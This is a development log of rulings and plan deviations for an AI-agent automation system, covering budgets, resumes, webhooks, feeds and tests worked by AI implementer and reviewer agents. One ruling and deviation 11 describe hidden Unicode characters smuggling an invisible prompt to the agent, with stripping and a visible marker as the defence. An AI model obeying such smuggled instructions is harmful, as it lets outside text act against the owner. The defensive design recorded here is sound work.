- Task 9: BASE 9f68e5e. Implementer (Sonnet) dispatched; reviewer Opus. Rulings carried: precheck AFTER pause+budget gates (manual.ts pre-check; fire tx re-checks), cap concurrent prechecks + deadline + group kill, a paused dry-run does not run the precheck (reports paused).
- [B] Task 18: re-review 1 (Sonnet) — I1 addressed (global extensions/packages as a session, projectTrusted false, offline, effective URL before credential; residuals: later-registered provider, trusted project extensions, declared-not-installed package); refresh addressed (only ctx.signal; residual: daemon stop mid-refresh). Important (docs): docs/agents/models.md:51 stale (3 statuses; extension code now runs in the helper per click; residuals; 'written once (atomic)' overclaims). Ruling: docs carried to Task 24 with the exact list in task-18-rereview-1.md (no runtime change) — cost if wrong: none at runtime.
- Task 9: implementer DONE_WITH_CONCERNS (5a9615d) — full gate green (unit 11394, int 136 files, build, budgets 213.7), RED, 8 mutants; contracts DryRunResult.precheck gains 'not_run_paused' (lane B must know at J3); dry-run over budget still runs the precheck; journal holds stripped first output line, error details 'precheck exit N'/'timeout'; daemon.ts composeM10 call edited in place (scopes; 342 lines); feed poller (T10) must call createPrecheckStep origin scheduler; webhooks never precheck (M10R68); setsid residual (M10R72) undocumented → T24. Controller ruling: a dry-run over budget mirrors the real fire — no precheck spawn, reports the budget refusal (not_run_budget) — folded into the review's fix round. Review (Opus) dispatched → task-9-review.md
- Ruling I2: on a TASK card, the limited state offers 'Resume now' and 'Cancel task' (automation.tasks.cancel, which already retires the pending resume via keysOf) — no bare 'Cancel resume' there; a limited task without a session still shows Cancel task. 'Cancel resume' (usage.cancelResume) stays for non-task sessions (session header chip). Fix round 1 → resume implementer (I1 + I2).
- [B] Task 20: fix round 1 DONE (f237b17) — resumeNow declares automation_paused; limited task card: Resume now / Cancel task / Open (no bare Cancel resume; no session → Cancel task only); 2 mutants; unit 11487, budgets 214.4. Controller-accepted (ruling met, tests reported).
- Ruling (fences): silent stripping hides that the agent got hidden content (Unicode tag chars can carry a whole invisible prompt) → the UI shows a visible marker where hidden characters were removed ('⟨N caractères cachés⟩'), the owner sees there was something. Sweep (both milestones): strip hidden chars at ingestion (webhook raw asRaw, feeds, issues) so the agent never receives them. Review (Sonnet) dispatched → task-22-review.md; marker folded into its fix round.
- [B] Task 22: review (Sonnet) spec ✅ / Approved; 0 C/I; 7 minors; stripping set right; aria-live announces only count increases. Fix round 1 (controller ruling only): visible marker for removed hidden characters in fences.
- Ruling I1: when the limited run has no task, resolve the task from the session (task session ↔ task) and use it for the m2 trigger check and expectOrigin/taskId of the scheduled resume; fix the two tests to the real flow (post-click resume carries NO task id in, the handler resolves it). → integrator fix round.
- Task 11: review (Opus) spec ❌ / Needs fixes — I1 journey 3 passes with the allowlist removed under pnpm test:int (echo hi is a covered read-only command when PATH is all absolute; test only checks no needs_input/no approved row) → command outside READ_ONLY_COMMANDS + assert error tool result and block-only audit like journey 1. Crash (a)/(d): NOT a race — echo is read-only-covered under pnpm run PATH; curl switch right, diagnosis wrong (m3). SIGKILL test real; budget price trick ok; markSent await is seam plumbing but adds a microtask yield before sending.add, contradicting 'synchronous' (m1); cancel hold inert in prod; hook-id no oracle; 6 rulings have unit proofs only (m2). 14 minors.
- Rulings: fix I1; fix m1 (keep the refusal → sending.add section synchronous; the seam must not add a yield before sending.add); add ONE exit-level proof for the click-resume exemption on both budget lines using the price trick (m2), since it is the most money-relevant ruling. Fix round 1 → resume implementer.

## Plan deviations ruled during execution

Each line: what the plan said, what the controller ruled, where it is documented. The code wins over the plan text above.

1. **No RT-13 clamp (Task 5a; M10R4, M10R116, M10R64).** The plan's red-team note read as if the runner lowers an owner's explicit `auto-accept-edits` for outside text. Ruled: the DEFAULT mode is `supervised` for webhook and feed triggers (`withDefaults`); an explicit owner choice is kept. The editor note (M10R116) and the dry-run's `editsUnasked` line say what runs unasked. Cost if wrong: an owner-chosen `auto-accept-edits` webhook edits unasked, which is what the owner chose with an honest note. See `automation.md` (Mode note, RT-13) and ADR 0041.
2. **`releaseTools` by session (Task 5b; M10R153).** `automation.tasks.releaseTools` takes `{taskId}` or `{sessionId}` and answers `{taskId | null, sessionId}`. A kept session whose task row housekeeping already deleted stays liftable: by session the call is owner-checked, step-up gated and audited, with the same confirmation. ADR 0041.
3. **Cancel wins over a resume already sending (J2 fix; M10R40, M10R105).** When Cancel's `outbox.cancel` answers `marked` for a resume that is already past its sent mark, `abort-next.ts` arms the session: the continuation's first run start is aborted before any tokens. One-shot; armed on the resume's own `sending` set; 60 s expiry; disarmed when the continuation settles without a run start; cleared at runner stop. ADR 0045.
4. **"Cancel task", not "Cancel resume", on a limited task card (Task 20; M10R114).** `usage.cancelResume` only retires the effect and left the task `limited` for ever. A limited task card offers Resume now, Cancel task (`automation.tasks.cancel`, which also retires the pending resume) and Open; a limited task with no session offers Cancel task only. "Cancel resume" stays for a session that is not a task (the header chip).
5. **A dry-run does not run the precheck when automation is paused or the owner is over budget (Task 9 fix; M10R64, M10R68).** The verdict is `not_run_paused` or `not_run_budget` (contract enum), mirroring the real fire, where the precheck runs after the pause and budget gates and a refused fire never spawns the command. A manual fire stays exempt from the budget gate, so its dry-run still runs the precheck.
6. **A trigger's own daily budget across runs (Task 8b, ruling of Task 5b; M10R66).** The trigger's `dailyBudgetUsd` is checked against the cost today of the runs of its tasks, live included, at fire time, at task start and across the run by `limits.ts`. At J3 the task's automatic resumes were put under it too (the run.resume handler checks it, `taskOf(owner, session)` resolves the task of a task-less run, J3 I1).
7. **The click-resume exemption on both budget lines (J2, J3 m1, Task 11 exit proof; M10R105, M10R106).** A "Resume now" click is the owner's action: it runs under origin `user`, so it is not automation spend and `runningGated` skips a task whose current run has that origin, for the owner's budget and for the trigger's own. The automation budget still gates the next automatic step; a scheduled auto-resume stays origin `resume` and counted. Proved at exit level in `security/automation-rulings.int.test.ts` with the price trick. See `finops.md`.
8. **`isUsingSubscription`, not `isUsingOAuth` (Task 12 fix; M10R86).** The plan text (lines for `billing`) names `modelRuntime.isUsingOAuth`; the code uses `modelRuntime.isUsingSubscription(provider)` (`packages/pi-host/src/loadout.ts`). `isUsingOAuth` marked OAuth API-key providers such as OpenRouter as subscriptions. Anywhere the plan or an ADR says `isUsingOAuth`, read `isUsingSubscription`.
9. **Auto-resume and Resume now (Task 17 fix; M10R104 to M10R106).** An owner prompt in flight defers the resume (30 s, before the sent mark); a paused automation defers it (5 min) and `autoResume` is re-read at fire time; the free-memory floor applies as at launch (`admits()`); "Resume now" sends inline in every state with no fresh outbox row (sync errors, no replay); a token's `resumeNow` past the budget answers `budget_reached`, in a pause `automation_paused`; with auto-resume off a limited task stays `limited` with Cancel and Resume now.
10. **Provider usage statuses and extension code in the helper (Task 18 fix; M10R109, M10R110).** Statuses are `ready`, `auth_unavailable`, `query_failed`, `unsupported`, plus `provider_overridden` and `extensions_failed`. The helper loads the owner's global extensions and enabled packages offline, as a session would, to see an extension that repoints a provider's base URL. The 15 s deadline bounds the HTTP request only, never credential resolution or an OAuth refresh. Residuals in `models.md`.
11. **Hidden characters stripped at ingestion and marked in the UI (Task 22 fix, sweep 1; M10R120).** Bidi, zero-width and other `\p{Cf}` characters, and C0/C1 controls except tab and new line, are stripped from a webhook's raw payload text and a feed entry when they enter pap (M9's issue text follows the same rule once merged), so the agent never receives them. The fence frame shows a visible marker where characters were removed (`aria-label`, en and fr). Trigger names show them escaped.
12. **Feeds are not fetched while automation is paused or the owner is over budget (sweep 1 item 5; M10R73).** The poll writes its own journal line (`paused` or `budget`) and sets no baseline, so the first poll after the pause still marks entries seen.
13. **Two locks on `full-access` (Task 4b fix; M10R153).** `setSessionMode` refuses `null` (inherit) and `full-access` with `session_busy` while the session is unattended, and `taskRules` clamps a stored `full-access` to `supervised` while unattended.
14. **Admission picks across owners (Task 5a fix; M10R36).** One pick among eligible owners, oldest last start first; a capacity-refused task is put off 30 s and excluded from the pick until due, so one owner cannot starve the rest.
15. **Missed fires (Task 8a fix; M10R59, M10R62).** The count of missed occurrences is capped at 1 000 ("1000+"), the real last miss comes from a bounded 12 h window walk; FREQ is checked with `Object.hasOwn`; `WEEKLY` without `BYHOUR` is refused; a repeated Paris 02:30 is 00:30Z and 01:30Z.
16. **Observability (Tasks 13 to 15 fixes; M10R91, M10R97, M10R99).** `labelValue` refuses a leading `/`, `~` or `.` and any `..` (path-shaped ids become `other`); the OTLP flush is a closer at the END of the daemon's stop (C3), so the stop's own spans are exported; the endpoint refuses userinfo, query and fragment; parsing is in `kernel/config-otlp.ts`; ids of exported spans are random.
17. **Outbox hold seam (Task 2 fix; M10R79, M10R80).** `PAP_TEST_OUTBOX_HOLD` claims and launches the row, and the handler waits for its abort, so the crash cases (b) and (c) really find a leased row.
18. **Webhook edges (Tasks 7a, 7b, 11).** A malformed or upper-case hook id answers 403 without an Origin (it is not a hook request, so the browser guard refuses it first) and 404 with the sender's own Origin; the route's own exception answers 500 with `connection: close` and `no-store`; `unauthorized` detail stores the mode and a count, and Settings builds the M10R161 sentence from it.
19. **Join artefact (J4, step 0 of Task 24).** `compose-m10.test.ts` and `daemon.outbox.int.test.ts` used `attachment.cleanup` as the kind without a handler; both lanes now register it, so the compose test lets the real handler settle its row and the boot test seeds M9's `lane.setup`, a kind no handler claims.
